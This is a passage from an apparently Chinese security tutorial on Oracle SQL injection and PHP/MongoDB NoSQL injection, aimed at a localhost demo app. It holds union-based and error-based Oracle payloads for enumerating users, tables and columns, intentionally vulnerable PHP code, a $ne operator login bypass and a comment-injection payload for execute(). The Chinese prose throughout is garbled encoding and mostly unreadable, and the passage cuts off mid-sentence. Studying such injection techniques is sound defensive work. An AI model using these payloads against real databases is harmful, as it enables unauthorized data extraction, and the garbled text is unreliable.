select column, group_function(column) from table [where condition] [group by group_by_expression] [having group_condition] [order by column]; Oracleè¦æ±‚selectåå¿…é¡»æŒ‡æ˜è¦æŸ¥è¯¢çš„è¡¨åï¼Œå¯ä»¥ç”¨dualã€‚ Oracleä½¿ç”¨ || æ‹¼æ¥å­—ç¬¦ä¸²ï¼ŒMySQLä¸­ä¸ºæˆ–è¿ç®—ã€‚ å•å¼•å·å’ŒåŒå¼•å·åœ¨Oracleä¸­è™½ç„¶éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åŒå¼•å·å¯ä»¥ç”¨æ¥æ¶ˆé™¤å…³é”®å­—ï¼Œæ¯”å¦‚sysdateã€‚ Oracleä¸­limitåº”è¯¥ä½¿ç”¨è™šè¡¨ä¸­çš„rownumå­—æ®µé€šè¿‡whereæ¡ä»¶åˆ¤æ–­ã€‚ Oracleä¸­æ²¡æœ‰ç©ºå­—ç¬¦ï¼Œ''å’Œâ€™nullâ€™éƒ½æ˜¯nullï¼Œè€ŒMySQLä¸­è®¤ä¸º''ä»ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ Oracleå¯¹æ•°æ®æ ¼å¼è¦æ±‚ä¸¥æ ¼ï¼Œæ¯”å¦‚union selectçš„æ—¶å€™ï¼Œæ”¾åˆ°ä¸‹æ–‡è®²ã€‚ Oracleçš„ç³»ç»Ÿè¡¨ï¼š - dba_tables : ç³»ç»Ÿé‡Œæ‰€æœ‰çš„è¡¨çš„ä¿¡æ¯ï¼Œéœ€è¦DBAæƒé™æ‰èƒ½æŸ¥è¯¢ - all_tables : å½“å‰ç”¨æˆ·æœ‰æƒé™çš„è¡¨çš„ä¿¡æ¯ - user_tables: å½“å‰ç”¨æˆ·åä¸‹çš„è¡¨çš„ä¿¡æ¯ - DBA_ALL_TABLESï¼šDBA ç”¨æˆ·æ‰€æ‹¥æœ‰çš„æˆ–æœ‰è®¿é—®æƒé™çš„å¯¹è±¡å’Œè¡¨ - ALL_ALL_TABLESï¼šæŸä¸€ç”¨æˆ·æ‹¥æœ‰çš„æˆ–æœ‰è®¿é—®æƒé™çš„å¯¹è±¡å’Œè¡¨ - USER_ALL_TABLESï¼šæŸä¸€ç”¨æˆ·æ‰€æ‹¥æœ‰çš„å¯¹è±¡å’Œè¡¨ DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES 4.3 ä¿¡æ¯æœé›† ä»ç°åœ¨å¼€å§‹ï¼Œæˆ‘ä»¬ä»¥æ³¨å…¥ç‚¹http://localhost:8080/oracleInject/index?username=adminä¸ºä¾‹è®²è§£ã€‚ä»£ç éšä¾¿å†™ä¸€ä¸ªjspç½‘é¡µå°±è¡Œäº†ã€‚ è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%25') from dual -- + è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version where banner like 'TNS%25') from dual -- + è·å–å½“å‰æ•°æ®åº“ http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT name FROM v$database) from dual -- + è·å–æ•°æ®åº“ç”¨æˆ· SELECT user FROM dual; è·å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ· SELECT username FROM all_users; SELECT name FROM sys.user$; -- éœ€è¦é«˜æƒé™ è·å–å½“å‰ç”¨æˆ·æƒé™ SELECT * FROM session_privs è·å–å½“å‰ç”¨æˆ·æœ‰æƒé™çš„æ‰€æœ‰æ•°æ®åº“ SELECT DISTINCT owner, table_name FROM all_tables è·å–è¡¨ï¼Œall_tablesç±»ä¼¼äºMySQLä¸­çš„information_schema.tablesï¼Œé‡Œé¢çš„ç»“æ„å¯ä»¥è‡ªå·±æ„é€ sqlè¯­å¥ã€‚ SELECT * FROM all_tables; è·å–å­—æ®µå SELECT column_name FROM all_tab_columns åœ¨Oracleå¯åŠ¨æ—¶ï¼Œåœ¨ userenv ä¸­å­˜å‚¨äº†ä¸€äº›ç³»ç»Ÿä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œé€šè¿‡ SYS_CONTEXT å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å–å›ç›¸åº”çš„å‚æ•°å€¼ã€‚åŒ…æ‹¬å½“å‰ç”¨æˆ·åç­‰ç­‰ã€‚ SELECT SYS_CONTEXTï¼ˆ'USERENV'ï¼Œ'SESSION_USER'ï¼‰ from dual; æ›´å¤šå¯ç”¨å‚æ•°è¯´æ˜å¯ä»¥æŸ¥é˜… Oracle æä¾›çš„æ–‡æ¡£ï¼šSYS_CONTEXT 4.4 æ³¨å…¥ç±»å‹ 4.4.1 è”åˆæŸ¥è¯¢ order by çŒœå­—æ®µæ•°é‡ï¼Œunion selectè¿›è¡ŒæŸ¥è¯¢ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ¯ä¸€ä¸ªå­—æ®µéƒ½éœ€è¦å¯¹åº”å‰é¢selectçš„æ•°æ®ç±»å‹(å­—ç¬¦ä¸²/æ•°å­—)ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å…ˆä½¿ç”¨nullå­—ç¬¦å ä½ï¼Œç„¶åé€ä½åˆ¤æ–­æ¯ä¸ªå­—æ®µçš„ç±»å‹ï¼Œæ¯”å¦‚ï¼š http://localhost:8080/oracleInject/index?username=admin' union select null,null,null from dual -- æ­£å¸¸ http://localhost:8080/oracleInject/index?username=admin' union select 1,null,null from dual -- æ­£å¸¸è¯´æ˜ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯æ•°å­—å‹ http://localhost:8080/oracleInject/index?username=admin' union select 1,2,null from dual -- ç¬¬äºŒä¸ªå­—æ®µä¸ºæ•°å­—æ—¶é”™è¯¯ http://localhost:8080/oracleInject/index?username=admin' union select 1,'asd',null from dual -- æ­£å¸¸ ä¸ºå­—ç¬¦ä¸² ä¾æ­¤ç±»æ¨ æŸ¥æ•°æ®åº“ç‰ˆæœ¬å’Œç”¨æˆ·å http://localhost:8080/oracleInject/index?username=admin' union select 1,(select user from dual),(SELECT banner FROM v$version where banner like 'Oracle%25') from dual -- æŸ¥å½“å‰æ•°æ®åº“ http://localhost:8080/oracleInject/index?username=admin' union select 1,(SELECT global_name FROM global_name),null from dual -- æŸ¥è¡¨ï¼Œwmsys.wm_concat()ç­‰åŒäºMySQLä¸­çš„group_concat()ï¼Œåœ¨11gr2å’Œ12Cä¸Šå·²ç»æŠ›å¼ƒï¼Œå¯ä»¥ç”¨LISTAGG()æ›¿ä»£ http://localhost:8080/oracleInject/index?username=admin' union select 1,(select LISTAGG(table_name,',')within group(order by owner)name from all_tables where owner='SYSTEM'),null from dual -- ä½†æ˜¯LISTAGG()è¿”å›çš„æ˜¯varcharç±»å‹ï¼Œå¦‚æœæ•°æ®è¡¨å¾ˆå¤šä¼šå‡ºç°å­—ç¬¦ä¸²é•¿åº¦è¿‡é•¿çš„é—®é¢˜ã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨é€šè¿‡å­—ç¬¦ä¸²æˆªå–æ¥è¿›è¡Œã€‚ æŸ¥å­—æ®µ http://localhost:8080/oracleInject/index?username=admin' union select 1,(select column_name from all_tab_columns where table_name='TEST' and rownum=2),null from dual -- æœ‰è¡¨åå­—æ®µåå‡ºæ•°æ®å°±ä¸è¯´äº†ã€‚ 4.5 æŠ¥é”™æ³¨å…¥ 4.5.1 utl_inaddr.get_host_name select utl_inaddr.get_host_name((select user from dual)) from dual; 11gä¹‹åï¼Œä½¿ç”¨æ­¤å‡½æ•°çš„æ•°æ®åº“ç”¨æˆ·éœ€è¦æœ‰è®¿é—®ç½‘ç»œçš„æƒé™ 4.5.2 ctxsys.drithsx.sn select ctxsys.drithsx.sn(1, (select user from dual)) from dual; å¤„ç†æ–‡æœ¬çš„å‡½æ•°ï¼Œå‚æ•°é”™è¯¯æ—¶ä¼šæŠ¥é”™ã€‚ 4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual; 4.5.4 XMLType http://localhost:8080/oracleInject/index?username=admin' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- æ³¨æ„urlç¼–ç ï¼Œå¦‚æœè¿”å›çš„æ•°æ®æœ‰ç©ºæ ¼çš„è¯ï¼Œå®ƒä¼šè‡ªåŠ¨æˆªæ–­ï¼Œå¯¼è‡´æ•°æ®ä¸å®Œæ•´ï¼Œè¿™ç§æƒ…å†µä¸‹å…ˆè½¬ä¸º hexï¼Œå†å¯¼å‡ºã€‚ 4.5.6 dbms_xdb_version.checkin select dbms_xdb_version.checkin((select user from dual)) from dual; 4.5.7 dbms_xdb_version.makeversioned select dbms_xdb_version.makeversioned((select user from dual)) from dual; 4.5.8 dbms_xdb_version.uncheckout select dbms_xdb_version.uncheckout((select user from dual)) from dual; 4.5.9 dbms_utility.sqlid_to_sqlhash SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual; 4.5.10 ordsys.ord_dicom.getmappingxpath select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual; 4.5.11 UTL_INADDR.get_host_name select UTL_INADDR.get_host_name((select user from dual)) from dual; 4.5.12 UTL_INADDR.get_host_address select UTL_INADDR.get_host_name('~'||(select user from dual)||'~') from dual; å‰©ä¸‹çš„å‚è€ƒä¸‹é¢çš„é“¾æ¥å§ï¼Œè¿™é‡Œåªæ˜¯åšä¸ªè®°å½• 0x05 MongoDB 5.1 NoSQLä¸MongoDBåŸºæœ¬æ¦‚å¿µ NoSQL NoSQLï¼ŒæŒ‡çš„æ˜¯éå…³ç³»å‹çš„æ•°æ®åº“ã€‚NoSQLæœ‰æ—¶ä¹Ÿç§°ä½œNot Only SQLçš„ç¼©å†™ï¼Œæ˜¯å¯¹ä¸åŒäºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç»Ÿç§°ã€‚ NoSQLç”¨äºè¶…å¤§è§„æ¨¡æ•°æ®çš„å­˜å‚¨ã€‚ï¼ˆä¾‹å¦‚è°·æ­Œæˆ–Facebookæ¯å¤©ä¸ºä»–ä»¬çš„ç”¨æˆ·æ”¶é›†ä¸‡äº¿æ¯”ç‰¹çš„æ•°æ®ï¼‰ã€‚è¿™äº›ç±»å‹çš„æ•°æ®å­˜å‚¨ä¸éœ€è¦å›ºå®šçš„æ¨¡å¼ï¼Œæ— éœ€å¤šä½™æ“ä½œå°±å¯ä»¥æ¨ªå‘æ‰©å±•ã€‚ NoSQL æ•°æ®åº“åˆ†ç±» ç±»å‹ éƒ¨åˆ†ä»£è¡¨ ç‰¹ç‚¹ åˆ—å­˜å‚¨ HbaseCassandraHypertable é¡¾åæ€ä¹‰ï¼Œæ˜¯æŒ‰åˆ—å­˜å‚¨æ•°æ®çš„ã€‚æœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ–¹ä¾¿å­˜å‚¨ç»“æ„åŒ–å’ŒåŠç»“æ„åŒ–æ•°æ®ï¼Œæ–¹ä¾¿åšæ•°æ®å‹ç¼©ï¼Œå¯¹é’ˆå¯¹æŸä¸€åˆ—æˆ–è€…æŸå‡ åˆ—çš„æŸ¥è¯¢æœ‰éå¸¸å¤§çš„IOä¼˜åŠ¿ã€‚ æ–‡æ¡£å­˜å‚¨ MongoDBCouchDB æ–‡æ¡£å­˜å‚¨ä¸€èˆ¬ç”¨ç±»ä¼¼jsonçš„æ ¼å¼å­˜å‚¨ï¼Œå­˜å‚¨çš„å†…å®¹æ˜¯æ–‡æ¡£å‹çš„ã€‚è¿™æ ·ä¹Ÿå°±æœ‰æœºä¼šå¯¹æŸäº›å­—æ®µå»ºç«‹ç´¢å¼•ï¼Œå®ç°å…³ç³»æ•°æ®åº“çš„æŸäº›åŠŸèƒ½ã€‚ key-valueå­˜å‚¨ Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis å¯ä»¥é€šè¿‡keyå¿«é€ŸæŸ¥è¯¢åˆ°å…¶valueã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå­˜å‚¨ä¸ç®¡valueçš„æ ¼å¼ï¼Œç…§å•å…¨æ”¶ã€‚ï¼ˆRedisåŒ…å«äº†å…¶ä»–åŠŸèƒ½ï¼‰ å›¾å­˜å‚¨ Neo4JFlockDB å›¾å½¢å…³ç³»çš„æœ€ä½³å­˜å‚¨ã€‚ä½¿ç”¨ä¼ ç»Ÿå…³ç³»æ•°æ®åº“æ¥è§£å†³çš„è¯æ€§èƒ½ä½ä¸‹ï¼Œè€Œä¸”è®¾è®¡ä½¿ç”¨ä¸æ–¹ä¾¿ã€‚ å¯¹è±¡å­˜å‚¨ db4oVersant é€šè¿‡ç±»ä¼¼é¢å‘å¯¹è±¡è¯­è¨€çš„è¯­æ³•æ“ä½œæ•°æ®åº“ï¼Œé€šè¿‡å¯¹è±¡çš„æ–¹å¼å­˜å–æ•°æ®ã€‚ xmlæ•°æ®åº“ Berkeley DB XMLBaseX é«˜æ•ˆçš„å­˜å‚¨XMLæ•°æ®ï¼Œå¹¶æ”¯æŒXMLçš„å†…éƒ¨æŸ¥è¯¢è¯­æ³•ï¼Œæ¯”å¦‚XQuery,Xpathã€‚ MongoDB MongoDBå±äºNoSQLæ•°æ®åº“çš„ä¸€ç§ï¼Œæ˜¯ç”±C++è¯­è¨€ç¼–å†™çš„ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„å¼€æºæ•°æ®åº“ç³»ç»Ÿï¼Œæ—¨åœ¨ä¸ºWebåº”ç”¨æä¾›å¯æ‰©å±•çš„é«˜æ€§èƒ½æ•°æ®å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚åœ¨é«˜è´Ÿè½½çš„æƒ…å†µä¸‹ï¼Œæ·»åŠ æ›´å¤šçš„èŠ‚ç‚¹ï¼Œå¯ä»¥ä¿è¯æœåŠ¡å™¨æ€§èƒ½ã€‚ MongoDB å°†æ•°æ®å­˜å‚¨ä¸ºä¸€ä¸ªæ–‡æ¡£ï¼Œæ•°æ®ç»“æ„ç”±é”®å€¼(key=&gt;value)å¯¹ç»„æˆã€‚MongoDB æ–‡æ¡£ç±»ä¼¼äº JSON å¯¹è±¡ã€‚å­—æ®µå€¼å¯ä»¥åŒ…å«å…¶ä»–æ–‡æ¡£ï¼Œæ•°ç»„åŠæ–‡æ¡£æ•°ç»„ã€‚ MongoDBæ¦‚å¿µè§£æ å’Œå…³ç³»å‹æ•°æ®åº“çš„ç›¸å…³æ¦‚å¿µä¸ä¸€æ ·ï¼Œåœ¨MongoDBä¸­åŸºæœ¬çš„æ¦‚å¿µæ˜¯æ–‡æ¡£ã€é›†åˆã€æ•°æ®åº“ï¼Œå¦‚ä¸‹è¡¨ï¼š SQLæœ¯è¯­/æ¦‚å¿µ MongoDBæœ¯è¯­/æ¦‚å¿µ è§£é‡Š/è¯´æ˜ database database æ•°æ®åº“ table collection æ•°æ®åº“è¡¨/é›†åˆ row document æ•°æ®è®°å½•è¡Œ/æ–‡æ¡£ column field æ•°æ®å­—æ®µ/åŸŸ index index ç´¢å¼• table joins è¡¨è¿æ¥,MongoDBä¸æ”¯æŒ primary key primary key ä¸»é”®,MongoDBè‡ªåŠ¨å°†_idå­—æ®µè®¾ç½®ä¸ºä¸»é”® 5.2 PHPæ“ä½œMongoDB PHPä¸‹æ“ä½œMongoDBå¤§è‡´åˆ†ä¸ºä¸¤ç§æ–¹å¼ï¼Œå¯¹åº”æœ‰ä¸åŒçš„æ³¨å…¥æ”»å‡»æ–¹å¼ã€‚ 5.2.1 ä½¿ç”¨MongoDBç±»ä¸­ç›¸åº”çš„æ–¹æ³• ä½¿ç”¨çš„Demoå¤§è‡´å¦‚ä¸‹ï¼Œæ­¤æ—¶ä¼ é€’è¿›å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼š &lt;?php $mongo = new MongoClient(); $db = $mongo-&gt;myinfo; //é€‰æ‹©æ•°æ®åº“ $coll = $db-&gt;test; //é€‰æ‹©é›†åˆ $coll-&gt;save(); //å¢ $coll-&gt;find(); //æŸ¥ $coll-&gt;remove(); //å‡ $coll-&gt;update(); //æ”¹ ?&gt; ç¡®ä¿è¿æ¥åŠé€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ ä¸ºäº†ç¡®ä¿æ­£ç¡®è¿æ¥ï¼Œä½ éœ€è¦æŒ‡å®šæ•°æ®åº“åï¼Œå¦‚æœæ•°æ®åº“åœ¨MongoDBä¸­ä¸å­˜åœ¨ï¼ŒMongoDBä¼šè‡ªåŠ¨åˆ›å»ºã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼Œè®¿é—®é¡µé¢ä¼šç›´æ¥è¿”å›æ•°æ®åº“åtestï¼š &lt;?php $m = new MongoClient(); // è¿æ¥é»˜è®¤ä¸»æœºå’Œç«¯å£ä¸ºï¼šmongodb://localhost:27017 $db = $m-&gt;test; // è·å–åç§°ä¸º \"test\" çš„æ•°æ®åº“ echo $db; ?&gt; 1. åˆ›å»ºé›†åˆ åˆ›å»ºé›†åˆçš„ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š &lt;?php $m = new MongoClient(); // è¿æ¥ $db = $m-&gt;test; // è·å–åç§°ä¸º \"test\" çš„æ•°æ®åº“ $collection = $db-&gt;createCollection(\"Mi1k\"); echo \"é›†åˆåˆ›å»ºæˆåŠŸï¼š\".$collection; ?&gt; åœ¨æ•°æ®åº“ä¸­ç¡®è®¤ç¡®å®åˆ›å»ºæˆåŠŸï¼š 2. æ’å…¥æ–‡æ¡£ åœ¨MongoDBä¸­ä½¿ç”¨insert()æ–¹æ³•æ’å…¥æ–‡æ¡£ï¼Œä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š &lt;?php $m = new MongoClient(); // è¿æ¥åˆ°mongodb $db = $m-&gt;test; // é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ $collection = $db-&gt;Mi1k; // é€‰æ‹©é›†åˆ $document = array( \"title\" =&gt; \"Hello\", \"description\" =&gt; \"Just a test.\", \"likes\" =&gt; 100, \"url\" =&gt; \"https://www.mi1k7ea.com/\", \"by\", \"mi1k7ea\" ); $collection-&gt;insert($document); echo \"æ•°æ®æ’å…¥æˆåŠŸ\"; ?&gt; æ’å…¥æˆåŠŸåï¼Œåˆ°æ•°æ®åº“ä¸­ç¡®è®¤ï¼Œè¿™é‡Œpretty()æ–¹æ³•ä»¥æ ¼å¼åŒ–çš„æ–¹å¼æ¥æ˜¾ç¤ºæ‰€æœ‰æ–‡æ¡£ã€‚ï¼š 3. æŸ¥æ‰¾æ–‡æ¡£ ä½¿ç”¨find()æ–¹æ³•æ¥è¯»å–é›†åˆä¸­çš„æ–‡æ¡£ï¼Œä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š &lt;?php $m = new MongoClient(); // è¿æ¥åˆ°mongodb $db = $m-&gt;test; // é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ $collection = $db-&gt;Mi1k; // é€‰æ‹©é›†åˆ $cursor = $collection-&gt;find(); // è¿­ä»£æ˜¾ç¤ºæ–‡æ¡£æ ‡é¢˜ foreach ($cursor as $document) { echo $document[\"title\"] . \" \"; } ?&gt; è®¿é—®å³å¯çœ‹åˆ°æŸ¥è¯¢çš„æ ‡é¢˜ï¼š 4. æ›´æ–°æ–‡æ¡£ ä½¿ç”¨update()æ–¹æ³•æ¥æ›´æ–°æ–‡æ¡£ï¼Œä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼Œå°†æ ‡é¢˜å†…å®¹ä»Helloæ”¹ä¸ºWorldï¼š &lt;?php $m = new MongoClient(); // è¿æ¥åˆ°mongodb $db = $m-&gt;test; // é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ $collection = $db-&gt;Mi1k; // é€‰æ‹©é›†åˆ // æ›´æ–°æ–‡æ¡£ $collection-&gt;update(array(\"title\"=&gt;\"Hello\"), array('$set'=&gt;array(\"title\"=&gt;\"World\"))); // æ˜¾ç¤ºæ›´æ–°åçš„æ–‡æ¡£ $cursor = $collection-&gt;find(); // å¾ªç¯æ˜¾ç¤ºæ–‡æ¡£æ ‡é¢˜ foreach ($cursor as $document) { echo $document[\"title\"] . \" \"; } ?&gt; ä¿®æ”¹åæ˜¾ç¤ºæ”¹åçš„æ ‡é¢˜å†…å®¹ï¼Œå®¢æˆ·ç«¯ç¡®è®¤æ˜¯ä¿®æ”¹äº†ï¼š 5. åˆ é™¤æ–‡æ¡£ ä½¿ç”¨remove()æ–¹æ³•æ¥åˆ é™¤æ–‡æ¡£ã€‚ ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼Œå°†ç§»é™¤â€™titleâ€™ä¸ºâ€™Worldâ€™çš„ä¸€æ¡æ•°æ®è®°å½•ï¼š &lt;?php $m = new MongoClient(); // è¿æ¥åˆ°mongodb $db = $m-&gt;test; // é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ $collection = $db-&gt;Mi1k; // é€‰æ‹©é›†åˆ // ç§»é™¤æ–‡æ¡£ $collection-&gt;remove(array(\"title\"=&gt;\"World\"), array(\"justOne\" =&gt; true)); // æ˜¾ç¤ºå¯ç”¨æ–‡æ¡£æ•°æ® $cursor = $collection-&gt;find(); foreach ($cursor as $document) { echo $document[\"title\"] . \" \"; } ?&gt; è®¿é—®ä¹‹åï¼Œå³åˆ é™¤äº†titleä¸ºWorldçš„æ–‡æ¡£ï¼Œåœ¨æ•°æ®åº“ä¸­æŸ¥ä¸åˆ°Mi1ké›†åˆçš„æ–‡æ¡£å†…å®¹äº†ã€‚ 5.2.2 ä½¿ç”¨execute()å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸² ä½¿ç”¨çš„Demoå¤§è‡´å¦‚ä¸‹ï¼Œæ­¤æ—¶ä¼ è¿›æ–¹æ³•execute()çš„å‚æ•°å°±æ˜¯å­—ç¬¦ä¸²å˜é‡$queryï¼ˆç‰¹åˆ«çš„ï¼Œæ­¤æ—¶çš„å­—ç¬¦ä¸²ä¹¦å†™è¯­æ³•ä¸ºJSçš„ä¹¦å†™è¯­æ³•ï¼‰ï¼š &lt;?php $mongo = new mongoclient(); $db = $mongo-&gt;myinfo; //é€‰æ‹©æ•°æ®åº“ $query = \"db.table.save({'newsid':1})\"; //å¢ $query = \"db.table.find({'newsid':1})\"; //æŸ¥ $query = \"db.table.remove({'newsid':1})\"; //å‡ $query = \"db.table.update({'newsid':1},{'newsid',2})\"; æ”¹ $result = $db-&gt;execute($query); ?&gt; 5.3 PHP MongoDBæ³¨å…¥æ”»å‡» ä¸åŒç¼–ç¨‹è¯­è¨€ç¯å¢ƒä¸‹çš„MongoDBæ³¨å…¥æƒ…æ™¯æ²¡å•¥å·®åˆ«ï¼Œè¿™é‡Œä¸»è¦å¯¹PHPä¸­å®ç°çš„MongoDBè¿›è¡Œè¯¦ç»†åˆ†æï¼Œç†è§£åŸç†å’Œåœºæ™¯å°±OKï¼Œå…¶ä»–è¯­è¨€å°±å¤§è‡´ç»™Demoå°±å¥½ã€‚ åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆå§‹åŒ–æ•°æ®åº“ã€èµ‹ç»™ä¸€äº›ç”¨æˆ·æ•°æ®ç”¨äºåé¢çš„Demoä½¿ç”¨ï¼Œè¿™é‡Œéšæœºæ·»åŠ 10ä¸ªç”¨æˆ·ï¼Œæœ€åä¸€ä¸ªtestç”¨æˆ·ä¸ºå…¬å…±ç”¨æˆ·ã€å¤§å®¶éƒ½çŸ¥é“çš„ï¼š &lt;?php $m = new MongoClient(); // è¿æ¥åˆ°mongodb $db = $m-&gt;test; // é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ $collection = $db-&gt;test; // é€‰æ‹©é›†åˆ $ori = '0123456789abcdefghijklmnopqrstuvwsyz'; for ($i=0; $i &lt; 10; $i++) { $str = ''; for ($j=0; $j &lt; 10; $j++) { $str .= $ori[rand(0, strlen($ori)-1)]; } $data = array( 'userid'=&gt;$i, 'username'=&gt;'user'.$i, 'password'=&gt;$str ); $collection-&gt;insert($data); } echo 'æ·»åŠ æˆåŠŸ&lt;br&gt;'; $data = array( 'userid'=&gt;10, 'username'=&gt;'test', 'password'=&gt;'test' ); $collection-&gt;insert($data); echo 'ç”¨æˆ·testæ·»åŠ æˆåŠŸ'; ?&gt; è®¿é—®è§¦å‘ä¸€éå³å¯åˆ›å»ºæˆåŠŸï¼š 5.3.1 PHPæ•°ç»„æ³¨å…¥/é‡è¨€å¼æ³¨å…¥ ä¸€ä¸ªæ•°ç»„ç»‘å®šçš„æŸ¥è¯¢ä»£ç å¦‚ä¸‹ï¼š &lt;?php $mongo = new MongoClient(); // è¿æ¥åˆ°mongodb $db = $mongo-&gt;test; //é€‰æ‹©æ•°æ®åº“ $coll = $db-&gt;test; //é€‰æ‹©é›†åˆ $username = $_GET['username']; $password = $_GET['password']; $data = array( 'username'=&gt;$username, 'password'=&gt;$password ); $data = $coll-&gt;find($data); $count = $data-&gt;count(); if ($count&gt;0) { foreach ($data as $user) { echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; } } else{ echo 'æœªæ‰¾åˆ°'; } ?&gt; å½“æˆ‘ä»¬ç”¨å…¬å…±ç”¨æˆ·testè¾“å…¥æ—¶ï¼Œæ˜¾ç¤ºå‡ºusernameå’Œpasswordï¼š åˆ†æä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘è¾“å…¥çš„æ˜¯?username=test&amp;password=testï¼Œç„¶åè¿›å…¥åˆ°MongoDBä¸­çš„è¯­å¥å…¶å®ä¸ºdb.test.find({username:'test',password:'test'});ã€‚ è‹¥æ­¤æ—¶æˆ‘ä»¬ä»¥PHPæ•°ç»„çš„å½¢å¼è¾“å…¥?username[a]=test&amp;password=testï¼Œæºç ä¸­$dataçš„å€¼ä¾¿ä¸ºï¼š $data = array( 'username'=&gt;array('a'=&gt;'test'), 'password'=&gt;'test' ); æœ€åå®é™…MongoDBæ‰§è¡Œçš„è¯­å¥ä¸ºdb.test.find({username:{a:'test'},password:'test'});ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¾€æ•°ç»„çš„é”®åä¼ é€’ä¸€ä¸ªæ“ä½œç¬¦ï¼ˆå¤§äºï¼Œå°äºï¼Œç­‰äºï¼Œä¸ç­‰äºç­‰ç­‰ï¼‰ï¼Œä»è€Œè¾¾åˆ°åˆ©ç”¨çš„ç›®çš„ï¼š ?username[$ne]=1&amp;password[$ne]=1 $neå³not equalä¸ç­‰äºï¼Œè½¬æ¢åˆ°MongoDBè¯­å¥å³ä¸ºï¼š db.test.find({username:{'$ne':'1'},password:{'$ne':'1'}}); è€Œè¯¥è¯­å¥ç›¸å½“äºï¼š select * from test where username!='1' and password!='1'; ç›´æ¥çˆ†å‡ºäº†æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·ä¿¡æ¯ï¼š 5.3.2 execute()æ‰§è¡Œæ‹¼æ¥å­—ç¬¦ä¸²å¯¼è‡´çš„æ³¨å…¥/è”åˆæŸ¥è¯¢æ³¨å…¥ ä»£ç å¦‚ä¸‹ï¼Œä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹æ³¨å…¥çš„è¯­å¥ï¼Œæˆ‘è¿™é‡Œæ·»åŠ äº†è¾“å‡ºæŸ¥è¯¢è¯­å¥ï¼š &lt;?php $username = $_GET['username']; $password = $_GET['password']; $query = \"var data = db.test.findOne({username:'$username',password:'$password'});return data;\"; echo $query.'&lt;br&gt;'; $mongo = new MongoClient(); $db = $mongo-&gt;test; $data = $db-&gt;execute($query); if ($data['ok'] == 1) { if ($data['retval']!=NULL) { echo 'username:'.$data['retval']['username'].\"&lt;/br&gt;\"; echo 'password:'.$data['retval']['password'].\"&lt;/br&gt;\"; }else{ echo 'æœªæ‰¾åˆ°'; } }else{ echo $data['errmsg']; } ?&gt; å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ç›´æ¥æ‹¼æ¥èµ·æ¥çš„å­—ç¬¦ä¸²ç„¶åä¼ å…¥execute()å‡½æ•°ä¸­æ‰§è¡Œã€‚ æ­£å¸¸è®¿é—®ï¼š æ·»åŠ ä¸ªå•å¼•å·è¯•è¯•ï¼Œå‘ç°ä¼šæŠ¥é”™ï¼š æ­¤æ—¶å¯ä»¥åˆ©ç”¨æ³¨é‡Šæˆ–é—­åˆçš„æ–¹æ³•é’ˆå¯¹æ€§åœ°å®ç°æ³¨å…¥å°±å¯ä»¥äº†ã€‚ åˆ©ç”¨æ³¨é‡Š æŒ‰ç…§è¾“å‡ºçš„æç¤ºè¯­å¥ä»¥åŠæŠ¥é”™ä¿¡æ¯é€ä¸ªå°è¯•ï¼Œç›®çš„æ˜¯æˆåŠŸæ³¨é‡Šæ‰åé¢çš„passwordéƒ¨åˆ†è¯­å¥å¹¶è¿”å›æˆåŠŸï¼Œå½“è¾“å…¥å¦‚ä¸‹payloadæ—¶æˆåŠŸè¿”å›ï¼š ?username=test'});return true;})//&amp;password=test è¿™é‡Œè¿”å›usernameå’Œpasswordä¸¤é¡¹ï¼ŒæŒ‰ç…§MongoDBæ•°æ®çš„Jsonæ 